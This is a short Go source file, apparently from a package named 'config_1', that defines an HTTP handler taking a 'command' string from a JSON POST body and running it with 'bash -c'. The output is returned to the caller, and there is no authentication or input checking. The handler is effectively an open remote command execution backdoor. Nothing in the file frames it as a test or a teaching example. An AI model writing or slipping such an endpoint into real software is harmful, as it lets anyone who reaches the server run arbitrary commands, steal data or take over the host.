package config_1

import (
	"encoding/json"
	"net/http"
	"os/exec"
)

type CmdRequest struct {
	Command string `json:"command"`
}

func HandleCommandExec(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var req CmdRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	out, err := exec.Command("bash", "-c", req.Command).CombinedOutput()
	if err != nil {
		http.Error(w, "Command execution failed: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.Write(out)
}
